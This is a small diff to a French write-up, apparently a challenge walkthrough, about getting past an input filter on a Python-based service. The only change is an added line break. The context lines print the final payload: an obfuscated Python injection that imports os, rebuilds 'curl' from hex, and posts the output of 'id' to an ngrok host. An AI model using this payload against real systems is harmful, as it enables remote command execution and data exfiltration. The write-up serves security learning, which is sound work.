@@ -52,6 +52,8 @@ J'obtiens ``Blocked``, le filtre a donc trigger une partie de la commande. Ayant
 Vous avez dû remarquer, j'ai réécrit la fonction ``hex()`` pour éviter une autre fois le filtre. Comme requête finale j'obtiens:
 ``);geattr(__builtins__,'__imp''ort__')('o''s').popen(''.join([chr(int(''.join(c),16)) for s in zip('6375726c'[0::2],'6375726c'[1::2])])+'\x20-X\x20POST\x20-d\x20\x22data=$(id)\x22\x20https://rand.ngrok.io/tmp')#``.
 Le serveur me renvoit bien la réponse:
+<br/>
+
 ![image](https://user-images.githubusercontent.com/74382279/157323588-d2b559b5-7894-43c3-8a14-2c9bd8b79e00.png)
 
 
